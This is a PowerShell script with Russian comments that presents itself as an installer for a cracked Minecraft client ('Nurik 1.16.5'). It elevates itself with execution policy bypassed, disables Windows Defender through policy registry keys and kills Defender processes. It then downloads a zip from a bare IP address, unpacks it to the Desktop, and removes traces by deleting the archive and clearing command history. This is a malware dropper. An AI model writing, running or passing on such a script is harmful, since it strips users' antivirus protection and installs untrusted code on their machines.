# Проверка прав администратора
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-Not ([Security.Principal.WindowsPrincipal]$currentUser).IsInRole($adminRole)) {
    Write-Host "Перезапуск с правами администратора..."
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Start-Process powershell.exe -ArgumentList $arguments -Verb RunAs
    exit
}

# Включение режима "Не беспокоить"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0 -ErrorAction SilentlyContinue

# Отключение Defender через реестр (альтернатива командлетам)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f

# Принудительное завершение процессов Defender
Get-Process -Name "MsMpEng", "NisSrv", "SecurityHealthService" -ErrorAction SilentlyContinue | Stop-Process -Force

# Скачивание с прогресс-баром
$url = "http://176.108.245.12:25565/uploads/Nurik_1.16.5_crack_1.zip"
$tempPath = "$env:TEMP\Nurik_1.16.5_crack_1.zip"

function Download-File {
    param(
        [string]$Url,
        [string]$TargetPath
    )
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadProgressChanged += {
        $percent = $_.ProgressPercentage
        Write-Progress -Activity "Загрузка файла" -Status "Загружено $percent%" -PercentComplete $percent
    }
    $webClient.DownloadFileAsync($Url, $TargetPath)
    while ($webClient.IsBusy) { Start-Sleep -Milliseconds 100 }
    Write-Progress -Activity "Загрузка файла" -Completed
}

Download-File -Url $url -TargetPath $tempPath

# Распаковка архива
Add-Type -AssemblyName System.IO.Compression.FileSystem
$destinationPath = "$env:USERPROFILE\Desktop\Nurik1.16.5"
if (!(Test-Path $destinationPath)) { New-Item -ItemType Directory -Path $destinationPath -Force }
[System.IO.Compression.ZipFile]::ExtractToDirectory($tempPath, $destinationPath)

# Очистка следов
Remove-Item -Path $tempPath -Force
Clear-History
